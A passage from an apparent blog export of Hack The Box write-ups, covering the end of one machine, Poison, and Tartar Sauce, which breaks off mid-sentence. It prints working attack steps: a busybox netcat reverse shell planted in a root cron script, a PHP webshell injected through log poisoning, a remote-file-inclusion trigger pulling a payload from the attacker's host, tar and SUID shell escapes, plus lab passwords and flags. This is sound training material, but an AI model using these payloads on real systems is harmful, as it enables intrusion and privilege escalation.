kernel.</p>\n<h3 id=\"users\">Users</h3>\n<pre><code>root:x:0:0:root:/root:/bin/bash\njames:x:1000:1000:james:/home/james/:/bin/bash\nmindy:x:1001:1001:mindy:/home/mindy:/bin/rbash\n</code></pre>\n<h3 id=\"suid-binaries\">SUID binaries</h3>\n<pre><code class=\"language-bash\">find / -perm -4000 -type f 2&gt;/dev/null\n</code></pre>\n<pre><code>/bin/su\n/bin/mount\n/bin/umount\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n</code></pre>\n<p>All standard binaries. No unusual SUID.</p>\n<h3 id=\"sudo\">Sudo</h3>\n<pre><code class=\"language-bash\">sudo -l\nbash: sudo: command not found\n</code></pre>\n<p><code>sudo</code> is not installed. No escalation via sudo.</p>\n<h3 id=\"root-processes\">Root processes</h3>\n<pre><code class=\"language-bash\">ps aux | grep root\n</code></pre>\n<p>Key processes:\n- <code>/bin/sh /opt/james-2.3.2/bin/run.sh</code> — James server (root)\n- <code>/usr/sbin/cron -f</code> — cron daemon (root)\n- <code>/usr/sbin/cupsd -l</code> — CUPS (root)\n- <code>/usr/sbin/cups-browsed</code> — CUPS browsed (root)</p>\n<h3 id=\"internal-network\">Internal network</h3>\n<pre><code class=\"language-bash\">ss -tlnp\n</code></pre>\n<ul>\n<li>SSH (22), SMTP (25), HTTP (80), POP3 (110), NNTP (119), James Admin (4555) — all interfaces</li>\n<li><strong>CUPS (631)</strong> — localhost only (not reachable externally)</li>\n</ul>\n<h3 id=\"writable-directories\">Writable directories</h3>\n<pre><code class=\"language-bash\">find / -writable -type d 2&gt;/dev/null\n</code></pre>\n<pre><code>/dev/shm\n/var/tmp\n/tmp\n/home/mindy\n/home/mindy/bin\n</code></pre>\n<hr>\n<h2 id=\"privilege-escalation-mindy-root\">Privilege Escalation // mindy → root</h2>\n<h3 id=\"rabbit-hole-cups-cve-2024-47176\">Rabbit hole: CUPS (CVE-2024-47176)</h3>\n<p>CUPS is running as root with <code>cups-browsed</code> listening on UDP 631 (0.0.0.0). Attempted exploitation via ligolo port forwarding and malicious IPP server sending crafted browsed packets.</p>\n<p><strong>Does not work for three reasons:</strong>\n1. The exploit requires someone to submit a <strong>print job</strong> to the malicious printer — on a headless machine nobody will ever print\n2. Even if triggered, the command executes as <code>lp</code> user, not root\n3. CUPS TCP service listens only on localhost, complicating the callback connection</p>\n<h3 id=\"actual-vector-cron-job-world-writable-script\">Actual vector: cron job + world-writable script</h3>\n<p>In <code>/opt/</code> there is a Python script with world-writable permissions:</p>\n<pre><code class=\"language-bash\">ls -la /opt/tmp.py\n-rwxrwxrwx 1 root root 105 Aug 22 2017 tmp.py\n</code></pre>\n<p>Original content:</p>\n<pre><code class=\"language-python\">#!/usr/bin/env python\nimport os\nimport sys\ntry:\n     os.system('rm -r /tmp/* ')\nexcept:\n     sys.exit()\n</code></pre>\n<p>The script cleans <code>/tmp/</code> — a classic maintenance task. The cron job executing it is <strong>not visible</strong> in <code>/etc/crontab</code> (which only contains standard hourly/daily/weekly/monthly jobs). The job is configured directly in root's crontab, not accessible to mindy via <code>crontab -l</code>.</p>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>World-writable script executed by root cron job</strong>. The script <code>/opt/tmp.py</code> has permissions <code>-rwxrwxrwx</code> (777), allowing any user to modify its content. A root cron job executes it periodically. Any code written into the file runs as root on the next cycle.</p>\n<p><strong>Structural root cause:</strong> excessive permissions on a script executed with elevated privileges. The file should be <code>0755</code> (or <code>0700</code>) with owner <code>root:root</code>, not <code>0777</code>. The combination of world-writable permissions + root cron execution is a classic misconfiguration enabling immediate privilege escalation.</p>\n</blockquote>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>Modified the script with <code>nano</code> to insert a reverse shell via busybox (available on the target):</p>\n<pre><code class=\"language-python\">#!/usr/bin/env python\nimport os\nimport sys\ntry:\n     os.system('busybox nc 10.10.14.139 443 -e /bin/bash')\nexcept:\n     sys.exit()\n</code></pre>\n<blockquote>\n<p><strong>Why busybox nc?</strong><br>\nThe standard <code>nc</code> on Debian 9 is the OpenBSD variant which <strong>does not support <code>-e</code></strong> (command execution on connection). <code>busybox nc</code> includes the <code>-e</code> flag, making it the most reliable method for a reverse shell without additional dependencies. Alternative: <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>.</p>\n</blockquote>\n<p>Start the listener:</p>\n<pre><code class=\"language-bash\">nc -nvlp 443\n</code></pre>\n<p>Wait for the cron job to execute (interval of a few minutes):</p>\n<pre><code>connect to [10.10.14.139] from (UNKNOWN) [10.129.9.253] 44650\n</code></pre>\n<h3 id=\"root-shell\">Root shell</h3>\n<pre><code class=\"language-bash\">id\nuid=0(root) gid=0(root) groups=0(root)\n\ncat /root/root.txt\n2d3f183f9f38468c4740e02c09261bfd\n</code></pre>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code>Nmap → 6 ports (22, 25, 80, 110, 119, 4555)\n  ↓\nWeb (80) → static site → dead end\n  ↓\nJames Admin (4555) → default creds root:root → listusers → 5 mail accounts\n  ↓\nsetpassword on all users → POP3 (110) → mindy's email → SSH creds mindy:P@55W0rd1!2@\n  ↓\nJames RCE exploit → directory traversal user → mail with reverse shell in /etc/bash_completion.d/\n  ↓\nSSH as mindy → triggers bash_completion.d → reverse shell as mindy (rbash bypassed)\n  ↓\n/opt/tmp.py world-writable (777) → modified with busybox reverse shell → root cron job → root\n</code></pre>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> obtained as mindy (via James RCE + bash_completion.d trigger)</li>\n<li><strong>Root:</strong> <code>2d3f183f9f38468c4740e02c09261bfd</code> (via cron job + world-writable script)</li>\n</ul>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>Default credentials are the initial vector:</strong> James Admin uses <code>root:root</code> by default. The first action on any unfamiliar service is to test default credentials — no sophisticated exploit needed.</li>\n<li><strong>Internal emails are a goldmine:</strong> employee mailboxes often contain plaintext credentials. After gaining admin access to the mail server, read ALL mailboxes, not just the first one.</li>\n<li><strong>The website was a distractor:</strong> despite Apache on port 80, the real attack vector was the James service. Don't invest too much time on a static attack surface when more promising services are available.</li>\n<li><strong>Directory traversal in user creation:</strong> the structural vulnerability in James is not a buffer overflow or injection — it's the lack of username validation. A simple concept with devastating consequences.</li>\n<li><strong>bash_completion.d as a persistence vector:</strong> any file in <code>/etc/bash_completion.d/</code> is executed on login. This legitimate bash mechanism becomes a code execution vector when an attacker can write files to that directory.</li>\n<li><strong>World-writable + cron = root:</strong> the combination of 777 permissions on a script and its periodic execution as root is a fatal misconfiguration. During post-exploitation, always look for writable files in non-standard directories (<code>/opt/</code>, <code>/srv/</code>, <code>/usr/local/</code>) — not just SUID and sudo.</li>\n<li><strong>CUPS on headless machines is a rabbit hole:</strong> the CUPS exploit requires a print job as trigger and yields a shell as <code>lp</code>, not root. On machines without a GUI and without users printing, it is not a viable vector.</li>\n<li><strong>busybox as a swiss-army knife:</strong> when the system's <code>nc</code> does not support <code>-e</code>, check if <code>busybox</code> is available — its nc implementation includes the <code>-e</code> flag for command execution.</li>\n</ul>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><strong>Total time:</strong> ~3 hours (evening session 28/03 + completion 29/03)</li>\n<li><strong>Where I spent the most time:</strong> Web enumeration (rabbit hole), CUPS investigation (rabbit hole), multiple attempts with different exploit payloads</li>\n<li><strong>Subjective difficulty:</strong> /10</li>\n</ul>"
    },
    {
      "title": "Poison",
      "slug": "poison",
      "date": "2026·03·28",
      "tags": [
        "htb",
        "medium",
        "freebsd",
        "lfi",
        "log-poisoning",
        "php-rce"
      ],
      "desc": "See also: WebServices and Reconnaissance-and-Information-Gathering",
      "body": "<h1 id=\"poison-hack-the-box\">Poison // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>FreeBSD</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.1.254</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>poison.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Apache (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<blockquote>\n<p>See also: WebServices and Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan poison.htb\n</code></pre>\n<pre><code>PORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 7.2 (FreeBSD) → SSH\n- <strong>80/tcp</strong> — Apache 2.4.29 + <strong>PHP 5.6.32</strong></p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.1.254  poison.htb&quot;\n</code></pre>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://poison.htb/ -x js,html,php,txt,json,docx -o scan/poison.dir\n</code></pre>\n<p>The web service on port 80 presents a page with a form to test local PHP scripts. Suggested files: <code>listfiles.php</code>, <code>phpinfo.php</code>, etc. The form uses <code>browse.php</code> with a <code>file</code> parameter in GET.</p>\n<h3 id=\"vhost-fuzzing\">VHost Fuzzing</h3>\n<pre><code class=\"language-bash\">ffuf -H &quot;Host: FUZZ.poison.htb&quot; -H &quot;User-Agent: PENTEST&quot; -c \\\n  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -u http://poison.htb/ -fs 289\n</code></pre>\n<p>No significant vhosts found — all return the same size (289).</p>\n<hr>\n<h2 id=\"foothold-lfi-log-poisoning-rce\">Foothold // LFI → Log Poisoning → RCE</h2>\n<h3 id=\"step-1-local-file-inclusion-lfi\">Step 1 // Local File Inclusion (LFI)</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Type:</strong> Local File Inclusion (LFI) in <code>browse.php</code></p>\n<p><strong>Structural root cause:</strong> The <code>file</code> parameter is passed directly to <code>include()</code> without sanitization. Any file path readable by the web process can be included and rendered as PHP.</p>\n</blockquote>\n<p>The <code>file</code> parameter in <code>browse.php</code> allows reading arbitrary files from the system:</p>\n<pre><code class=\"language-http\">GET /browse.php?file=/etc/passwd HTTP/1.1\nHost: poison.htb\n</code></pre>\n<p>Confirmation: the content of <code>/etc/passwd</code> is returned in the response. User <strong>charix</strong> is identified.</p>\n<h3 id=\"step-2-log-poisoning-rce\">Step 2 // Log Poisoning → RCE</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Type:</strong> Log Poisoning → Remote Code Execution</p>\n<p><strong>Structural root cause:</strong> The LFI also includes Apache log files (<code>/var/log/httpd-access.log</code>), which contain the attacker-controlled User-Agent. Injecting PHP code into the User-Agent turns the log into a webshell when included via <code>browse.php</code>.</p>\n</blockquote>\n<p><strong>Phase 1 — Injecting PHP payload into Apache logs:</strong></p>\n<p>A request is sent with a User-Agent containing a PHP webshell:</p>\n<pre><code class=\"language-http\">GET / HTTP/1.1\nHost: poison.htb\nUser-Agent: &lt;?php system($_REQUEST['cmd']); ?&gt;\n</code></pre>\n<p>The payload is written to the Apache log. From this point on, every inclusion of the log will execute the PHP code.</p>\n<p><strong>Phase 2 — Triggering RCE via LFI on the log:</strong></p>\n<p>The poisoned log file is included via LFI, passing a command via the <code>cmd</code> parameter:</p>\n<pre><code class=\"language-http\">GET /browse.php?file=/var/log/httpd-access.log&amp;cmd=cat+pwdbackup.txt HTTP/1.1\nHost: poison.htb\n</code></pre>\n<h3 id=\"step-3-credential-recovery-from-pwdbackuptxt\">Step 3 // Credential Recovery from <code>pwdbackup.txt</code></h3>\n<p>The file <code>pwdbackup.txt</code> contains a Base64 encoded blob <strong>13 times</strong> consecutively. The file header confirms this:</p>\n<pre><code>This password is secure, it's encoded atleast 13 times.. what could go wrong really..\n\nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0x...\n</code></pre>\n<blockquote>\n<p><strong>Encoding ≠ Encryption</strong><br>\nRepeated Base64 13 times adds no security — it is just obfuscation. Every iteration is completely reversible without a key.</p>\n</blockquote>\n<p>After 13 iterations of Base64 decoding, the plaintext password is obtained:</p>\n<pre><code>Charix!2#4%6&amp;8(0\n</code></pre>\n<h3 id=\"step-4-ssh-as-charix\">Step 4 // SSH as charix</h3>\n<pre><code class=\"language-bash\">ttylog-wrap ssh-poison ssh charix@poison.htb\n</code></pre>\n<blockquote>\n<p><strong>Credentials</strong><br>\n<strong>User:</strong> <code>charix</code>\n<strong>Password:</strong> <code>Charix!2#4%6&amp;8(0</code></p>\n</blockquote>\n<p>Shell obtained as <strong>charix</strong> on FreeBSD.</p>\n<hr>\n<h2 id=\"privilege-escalation-vnc-as-root\">Privilege Escalation // VNC as root</h2>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Type:</strong> VNC server running as root on localhost, with password file accessible to user charix</p>\n<p><strong>Structural root cause:</strong> The Xvnc service runs with root privileges and authenticates via <code>/root/.vnc/passwd</code>. A copy of this file (<code>secret.zip</code>) is located in charix's home directory, protected only by the user's own password. VNC is exposed only on localhost but is reachable via SSH tunneling.</p>\n</blockquote>\n<h3 id=\"enumeration_1\">Enumeration</h3>\n<p>In charix's home directory, there is a file <code>secret.zip</code>:</p>\n<pre><code class=\"language-bash\">charix@Poison:~ % ls -la\n-rw-r-----  1 root    charix      166 Mar 19  2018 secret.zip\n</code></pre>\n<p>The zip is encrypted with the same password as the user:</p>\n<pre><code class=\"language-bash\">unzip secret.zip\n# Password: Charix!2#4%6&amp;8(0\n# Extracted: secret (8 bytes, binary data)\n</code></pre>\n<pre><code class=\"language-bash\">file secret\n# secret: Non-ISO extended-ASCII text, with no line terminators\n\nxxd secret\n# 00000000: bda8 5b7c d596 7a21                      ..[|..z!\n</code></pre>\n<p>The file <code>secret</code> is a <strong>VNC password file</strong> — 8 bytes of obfuscated DES, standard format for TightVNC/RealVNC authentication.</p>\n<h3 id=\"vnc-service-discovery\">VNC Service Discovery</h3>\n<p>Enumerate services listening on localhost:</p>\n<pre><code class=\"language-bash\">sockstat -4 -l\n# or\nnetstat -an -p tcp\n</code></pre>\n<p>Ports <strong>5801</strong> and <strong>5901</strong> listening on <code>127.0.0.1</code> — VNC service not reachable from outside.</p>\n<p>The process runs as <strong>root</strong>:</p>\n<pre><code>root  Xvnc :1 -desktop X -auth /root/.Xauthority -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost\n</code></pre>\n<h3 id=\"ssh-port-forwarding\">SSH Port Forwarding</h3>\n<p>Since VNC listens only on localhost, create an SSH tunnel:</p>\n<pre><code class=\"language-bash\">ssh -L 5901:127.0.0.1:5901 charix@poison.htb\n</code></pre>\n<h3 id=\"vnc-confirmation\">VNC Confirmation</h3>\n<p>Verify the service with nmap through the tunnel:</p>\n<pre><code class=\"language-bash\">nmap -p 5901 --script vnc-info localhost\n</code></pre>\n<pre><code>PORT     STATE SERVICE\n5901/tcp open  vnc-1\n| vnc-info:\n|     VNC Authentication (2)\n|_    STDV VNCAUTH_ (2)\n</code></pre>\n<p>Authentication type: <strong>VNC Authentication</strong> — accepts password file.</p>\n<h3 id=\"connect-as-root-via-vnc\">Connect as root via VNC</h3>\n<pre><code class=\"language-bash\">vncviewer -passwd secret 127.0.0.1:5901\n</code></pre>\n<p>Access to <strong>root's X11 desktop</strong> is obtained. Root shell obtained.</p>\n<h3 id=\"flag-exfiltration\">Flag Exfiltration</h3>\n<p>Since copy/paste is not enabled in the VNC session, the flag is exfiltrated via HTTP:</p>\n<p><strong>On the VNC desktop (root):</strong></p>\n<pre><code class=\"language-bash\">python -m SimpleHTTPServer 9001\n</code></pre>\n<p><strong>From the SSH session (charix):</strong></p>\n<pre><code class=\"language-bash\">wget http://127.0.0.1:9001/root/root.txt\n</code></pre>\n<hr>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> ✓ obtained as <code>charix</code></li>\n<li><strong>Root:</strong> ✓ obtained via VNC root session</li>\n</ul>\n<hr>\n<h2 id=\"attack-chain\">Attack Chain</h2>\n<pre><code class=\"language-text\">Nmap (22, 80) → LFI on browse.php?file= \n→ Log Poisoning (User-Agent PHP webshell) \n→RCE via /var/log/httpd-access.log \n→ pwdbackup.txt (Base64 x13 decode) \n→Password: Charix!2#4%6&amp;8(0 \n→ SSH charix \n→secret.zip (same password) \n→ VNC password file (8 bytes) \n→SSH tunnel -L 5901 \n→ vncviewer -passwd secret \n→ Root X11 desktop\n</code></pre>\n<hr>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>Log Poisoning</strong>: the combination of LFI + log file with a field controllable by the attacker (User-Agent) is a classic pattern to convert an LFI into RCE</li>\n<li><strong>Encoding ≠ Encryption</strong>: Base64 repeated 13 times adds no security — every iteration is completely reversible</li>\n<li><strong>Password Reuse</strong>: the same password <code>Charix!2#4%6&amp;8(0</code> used for the SSH user, the zip file, and effectively for VNC (the password file is derived from the same credentials)</li>\n<li><strong>VNC on localhost ≠ secure</strong>: a service listening only on 127.0.0.1 is reachable by any local user or via SSH tunneling</li>\n<li><strong>VNC password file</strong>: the format is DES-obfuscated 8 bytes — not encrypted, just obfuscated. Tools like <code>vncpasswd</code> generate it and <code>vncviewer -passwd</code> consumes it directly</li>\n</ul>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><strong>Total time:</strong> ~4h (including enumeration)</li>\n<li><strong>Where I spent most time:</strong> Understanding the format of the <code>secret</code> file and how to use it with VNC</li>\n<li><strong>Subjective difficulty:</strong> 5/10</li>\n</ul>"
    },
    {
      "title": "Tartar Sauce",
      "slug": "tartar-sauce",
      "date": "2026·03·15",
      "tags": [
        "htb",
        "medium",
        "linux",
        "wordpress",
        "rfi",
        "gwolle-gb"
      ],
      "desc": "Only port 80 is open — Apache/2.4.18 (Ubuntu). Nmap directly detects robots.txt with 5 disallowed entries.",
      "body": "<h1 id=\"tartar-sauce-hack-the-box\">Tartar Sauce // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.1.185</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>tartarsauce.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>HTTP/Apache (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan tartarsauce.htb\n</code></pre>\n<pre><code>PORT   STATE SERVICE REASON         VERSION\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 5 disallowed entries\n| /webservices/tar/tar/source/\n| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/\n|_/webservices/developmental/ /webservices/phpmyadmin/\n|_http-title: Landing Page\n</code></pre>\n<p>Only port 80 is open — Apache/2.4.18 (Ubuntu). Nmap directly detects <code>robots.txt</code> with 5 disallowed entries.</p>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<p><strong>robots.txt</strong> reveals several paths under <code>/webservices/</code>:\n- <code>/webservices/monstra-3.0.4/</code> — Monstra CMS 3.0.4\n- <code>/webservices/tar/tar/source/</code>\n- <code>/webservices/easy-file-uploader/</code>\n- <code>/webservices/developmental/</code>\n- <code>/webservices/phpmyadmin/</code></p>\n<p>Most paths return 404 — only Monstra is reachable.</p>\n<h3 id=\"monstra-cms-rabbit-hole\">Monstra CMS (Rabbit Hole)</h3>\n<p>Monstra 3.0.4 is accessible with default credentials <code>admin:admin</code>. Admin panel is functional, <strong>but file upload fails</strong> — upload directories have restrictive permissions (root-owned, www-data cannot write). This is not a machine bug, it is intentional.</p>\n<h3 id=\"wordpress\">WordPress</h3>\n<p>WordPress 4.9.4 found at <code>/webservices/wp/</code>. The site appears broken in the browser (malformed URLs in HTML source).</p>\n<blockquote>\n<p><strong>wpscan detection mode</strong><br>\nThe default <code>passive</code> detection mode of wpscan does not find plugins on this target. <code>--plugins-detection aggressive</code> is required to enumerate all of them.</p>\n</blockquote>\n<p><strong>Plugin enumeration</strong> (<code>wpscan --plugins-detection aggressive</code>):</p>\n<table>\n<thead>\n<tr>\n<th>Plugin</th>\n<th>Version</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>akismet</td>\n<td>4.0.3</td>\n<td>XSS stored — not exploitable without user</td>\n</tr>\n<tr>\n<td>brute-force-login-protection</td>\n<td>1.5.3</td>\n<td>Protects against brute force</td>\n</tr>\n<tr>\n<td><strong>gwolle-gb</strong></td>\n<td><strong>2.3.10</strong></td>\n<td><strong>Fake version! Changelog reveals: \"Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D\"</strong></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"gwolle-guestbook-rfi-cve-2015-8351\">Gwolle Guestbook // RFI (CVE-2015-8351)</h3>\n<blockquote>\n<p><strong>Vulnerability — CVE-2015-8351</strong><br>\n<strong>WordPress Plugin Gwolle Guestbook 1.5.3</strong> — Remote File Inclusion. The <code>abspath</code> parameter in <code>ajaxresponse.php</code> is passed directly to <code>require()</code>, allowing inclusion and execution of remote PHP files.</p>\n<p><strong>Structural root cause:</strong> the HTTP GET parameter <code>abspath</code> is not validated before being used in <code>require()</code>. The absence of a whitelist or path sanitization allows inclusion of remote resources when <code>allow_url_include</code> is enabled.</p>\n</blockquote>\n<pre><code>searchsploit &quot;gwolle&quot;\n→ WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion\n</code></pre>\n<p>The plugin is actually at version <strong>1.5.3</strong>, vulnerable to <strong>Remote File Inclusion</strong>. The version in readme.txt was modified by the machine author to trick wpscan.</p>\n<p>From the plugin changelog (<code>readme.txt</code>):</p>\n<pre><code>== Changelog ==\n\n= 2.3.10 =\n* 2018-2-12\n* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D\n</code></pre>\n<hr>\n<h2 id=\"initial-access\">Initial Access</h2>\n<p>Exploit RFI with custom script (<code>exploit2.py</code>) — generates <code>wp-load.php</code> (PHP reverse shell) and starts an HTTP server on port 8001 (changed from 8000 to avoid conflicts). Fix applied: indentation error in the original script.</p>\n<pre><code class=\"language-bash\"># Terminal 1 // listener\nnc -nvlp 80\n\n# Terminal 2 // exploit (HTTP server + payload)\npython3 exploit2.py http://tartarsauce.htb/webservices/wp/ 10.10.14.139 80\n\n# Terminal 3 // trigger RFI\ncurl -v -s http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.139:8001/\n</code></pre>\n<p>Shell obtained as <code>www-data</code>. Upgrade TTY:</p>\n<pre><code class=\"language-bash\">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 40 cols 160\n</code></pre>\n<h3 id=\"post-exploitation-wp-configphp\">Post-exploitation // wp-config.php</h3>\n<pre><code class=\"language-bash\">www-data@TartarSauce:/var/www/html/webservices/wp$ cat wp-config.php\n</code></pre>\n<pre><code class=\"language-php\">define('DB_USER', 'wpuser');\ndefine('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');\n</code></pre>\n<p>System user found in <code>/etc/passwd</code>: <strong>onuma</strong> (uid 1000).</p>\n<hr>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<h3 id=\"www-data-onuma\">www-data → onuma</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>sudo misconfiguration</strong> — www-data can execute <code>/bin/tar</code> as user <strong>onuma</strong> without a password. <code>tar</code> is present on GTFOBins as a binary that allows shell escape via <code>--to-command</code>, <code>--checkpoint-action</code>, or the <code>-I</code> flag.</p>\n<p><strong>Structural root cause:</strong> <code>tar</code> is a binary that supports arbitrary command execution via multiple flags. Granting <code>sudo</code> on <code>tar</code> is equivalent to granting a shell as the target user.</p>\n</blockquote>\n<p>Exploited via GTFOBins:</p>\n<pre><code class=\"language-bash\">www-data@TartarSauce:$ sudo -u onuma /bin/tar xf /dev/null -I '/bin/sh -c &quot;/bin/sh 0&lt;&amp;2 1&gt;&amp;2&quot;'\nonuma@TartarSauce:$\n</code></pre>\n<pre><code class=\"language-sh\">onuma@TartarSauce:/var/tmp$ cat ~/user.txt  \nd78af224410873284592087e5cd18b1a\n</code></pre>\n<p><strong>user.txt</strong> obtained.</p>\n<h3 id=\"onuma-root-race-condition-in-backuperer\">onuma → root (Race Condition in backuperer)</h3>\n<h4 id=\"discovery\">Discovery</h4>\n<p>Monitoring processes with <code>pspy32</code> (transferred via HTTP from the attacking machine), an script <code>/usr/sbin/backuperer</code> executed as <strong>root</strong> every 5 minutes is identified:</p>\n<pre><code class=\"language-bash\">onuma@TartarSauce:/tmp$ wget http://10.10.14.139/pspy32\nonuma@TartarSauce:/tmp$ chmod +x pspy32\nonuma@TartarSauce:/tmp$ ./pspy32\n</code></pre>\n<pre><code>CMD: UID=0  PID=2310  | /bin/bash /usr/sbin/backuperer\n</code></pre>\n<h4 id=\"script-analysis\">Script Analysis</h4>\n<pre><code class=\"language-bash\">onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer\n</code></pre>\n<p>Variables: the name of the temporary file is a random SHA1 hash preceded by <code>.</code> (hidden file), created in <code>/var/tmp/</code> (world-writable).</p>\n<pre><code class=\"language-bash\">basedir=/var/www/html\nbkpdir=/var/backups\ntmpdir=/var/tmp\nerrormsg=$bkpdir/onuma_backup_error.txt\ntmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)\ncheck=$tmpdir/check\n</code></pre>\n<p>Cleanup of previous files and creation of the archive. The script uses <code>sudo -u onuma</code> to create the tar — so the file is owned by onuma and writable by onuma.</p>\n<pre><code class=\"language-bash\">/bin/rm -rf $tmpdir/.* $check\n/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &amp;\n</code></pre>\n<p><strong>30-second sleep</strong> — this is the window of the race condition. The archive already exists in <code>/var/tmp/</code> as an onuma file, and the script waits before using it.</p>\n<pre><code class=\"language-bash\">/bin/sleep 30\n</code></pre>\n<h4 id=\"exploit-race-condition\">Exploit // Race Condition</h4>\n<p>Script <code>try.sh</code> for replacing the archive during the 30-second window:</p>\n<pre><code class=\"language-bash\">#!/bin/bash\n/bin/tar -zcvf html -C /tmp var/www/html\nsleep 3\nls -a | grep '^\\.[^.]' &gt; hash.txt\nzip=$(cat hash.txt)\nrm $zip\nmv html /var/tmp/$zip\n</code></pre>\n<p>Execution: monitor <code>/var/tmp/</code> with <code>watch -n 1 ls -la /var/tmp/</code>, when the hidden file appears, launch <code>./try.sh</code> from <code>/var/tmp/</code>.</p>\n<h4 id=\"flag\">Flag</h4>\n<pre><code class=\"language-bash\">onuma@TartarSauce:/var/tmp$ cat /var/backups/onuma_backup_error.txt\n</code></pre>\n<pre><code>------------------------------------------------------------------------\nIntegrity Check Error in backup last ran :  Thu Mar 19 20:50:13 EDT 2026\n------------------------------------------------------------------------\n/var/tmp/.fa315b46de3117b9cf1f0b9934c91955579c5285\ndiff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt\n1,7c1\n&lt; User-agent: *\n&lt; Disallow: /webservices/tar/tar/source/\n&lt; Disallow: /webservices/monstra-3.0.4/\n&lt; Disallow: /webservices/easy-file-uploader/\n&lt; Disallow: /webservices/developmental/\n&lt; Disallow: /webservices/phpmyadmin/\n&lt;\n---\n&gt; d9429225b3c86932f7b4d092c9569553\n</code></pre>\n<p><strong>root.txt</strong>: <code>d9429225b3c86932f7b4d092c9569553</code></p>\n<h4 id=\"alternative-method-root-shell-via-suid-binary\">Alternative Method // Root Shell via SUID Binary</h4>\n<p>Besides reading files via symlink+diff, an <strong>interactive root shell</strong> can be obtained using the same race condition with a SUID binary.</p>\n<p><strong>1. Compile a SUID binary on the attacking machine</strong> (static compilation to avoid glibc issues):</p>\n<pre><code class=\"language-c\">// evil.c\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void){\n    setreuid(0,0);\n    system(&quot;/bin/bash&quot;);\n}\n</code></pre>\n<pre><code class=\"language-bash\">gcc -m32 -static -o evil evil.c\n</code></pre>\n<blockquote>\n<p><strong>Static compilation mandatory</strong><br>\nRequires <code>libc6-dev-i386</code> or <code>gcc-multilib</code> for 32-bit cross-compilation. The <code>-static</code> flag is <strong>mandatory</strong> because Kali’s modern glibc is incompatible with Ubuntu 16.04 of the target — without <code>-static</code> the binary fails with <code>GLIBC_2.34 not 